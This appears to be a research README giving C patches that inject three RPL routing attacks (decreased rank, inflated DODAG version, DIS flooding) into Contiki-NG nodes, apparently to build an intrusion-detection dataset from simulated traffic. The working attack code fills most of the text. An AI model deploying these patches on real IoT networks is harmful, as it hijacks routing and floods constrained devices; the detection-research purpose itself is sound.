CONTIKI-NG MODIFICATIONS FOR ATTACK INJECTION

This work injects three RPL routing attacks into the Contiki-NG rpl-lite
stack and the example UDP client. Each attack is guarded by the compile-time
macro RPL_ATTACK_TYPE and restricted to the node id given by RPL_ATTACKER_ID
(a range via RPL_ATTACKER_ID_MIN..RPL_ATTACKER_ID_MAX is also supported).
Because the attacker is chosen at compile time, the same attack can be
launched from any node by rebuilding, which enables the attacker-held-out
generalization experiment.

Attack type codes: 1 = decreased rank, 2 = version number, 3 = DIS flooding.

Apply the three patches below to a clean Contiki-NG checkout, then set the
macros in examples/rpl-udp/project-conf.h (see simulation/project-conf.h).

--------------------------------------------------------------------------
1. DECREASED RANK   file: os/net/routing/rpl-lite/rpl-dag.c
--------------------------------------------------------------------------
Inserted right after the preferred parent is selected and the rank computed.
When the local node is the attacker, it overwrites its advertised rank with
the lowest possible value, luring neighbors into selecting it as parent.

  #ifdef RPL_ATTACK_TYPE
  #ifndef RPL_ATTACKER_ID_MIN
  #define RPL_ATTACKER_ID_MIN RPL_ATTACKER_ID
  #endif
  #ifndef RPL_ATTACKER_ID_MAX
  #define RPL_ATTACKER_ID_MAX RPL_ATTACKER_ID
  #endif
      if(node_id >= RPL_ATTACKER_ID_MIN && node_id <= RPL_ATTACKER_ID_MAX) {
  #if RPL_ATTACK_TYPE == 1
        if(curr_instance.dag.rank != RPL_INFINITE_RANK) {
          curr_instance.dag.rank = ROOT_RANK + curr_instance.min_hoprankinc;
        }
  #endif
      }
  #endif

--------------------------------------------------------------------------
2. VERSION NUMBER   file: os/net/routing/rpl-lite/rpl-icmp6.c
--------------------------------------------------------------------------
Inserted where the DIO message is assembled, just after the instance id is
written. When the local node is the attacker (and not the root), it writes an
inflated DODAG version into the outgoing DIO, forcing repeated global repairs.
The else falls through to the original line writing the true version, so
non-attacker nodes are unaffected.

  buffer = UIP_ICMP_PAYLOAD;
  buffer[pos++] = curr_instance.instance_id;
  #if defined(RPL_ATTACK_TYPE) && (RPL_ATTACK_TYPE == 2)
  #ifndef RPL_ATTACKER_ID_MIN
  #define RPL_ATTACKER_ID_MIN RPL_ATTACKER_ID
  #endif
  #ifndef RPL_ATTACKER_ID_MAX
  #define RPL_ATTACKER_ID_MAX RPL_ATTACKER_ID
  #endif
    if(node_id >= RPL_ATTACKER_ID_MIN && node_id <= RPL_ATTACKER_ID_MAX
       && !rpl_dag_root_is_root()) {
      buffer[pos++] = curr_instance.dag.version + 5;
    } else
  #endif
    buffer[pos++] = curr_instance.dag.version;

--------------------------------------------------------------------------
3. DIS FLOODING   file: examples/rpl-udp/udp-client.c
--------------------------------------------------------------------------
Inserted at the top of the periodic send loop. When the local node is the
attacker, it emits a burst of multicast DIS solicitations every period,
compelling neighbors to answer with a flood of DIO messages.

  #if defined(RPL_ATTACK_TYPE) && (RPL_ATTACK_TYPE == 3)
  #ifndef RPL_ATTACKER_ID_MIN
  #define RPL_ATTACKER_ID_MIN RPL_ATTACKER_ID
  #endif
  #ifndef RPL_ATTACKER_ID_MAX
  #define RPL_ATTACKER_ID_MAX RPL_ATTACKER_ID
  #endif
      if(node_id >= RPL_ATTACKER_ID_MIN && node_id <= RPL_ATTACKER_ID_MAX) {
        int f;
        for(f = 0; f < 10; f++) {
          rpl_icmp6_dis_output(NULL);
        }
      }
  #endif

--------------------------------------------------------------------------
FEATURE LOGGING
--------------------------------------------------------------------------
Each node periodically prints a FEATURES line (node id, rank, parent,
rank_changes, tx, rx, missed, routes, tx_e, rx_e, dio, dis, dao, disrx,
version) from the UDP client send loop. These lines are what
scripts/make_network_dataset.py parses into 30-second network-level windows.
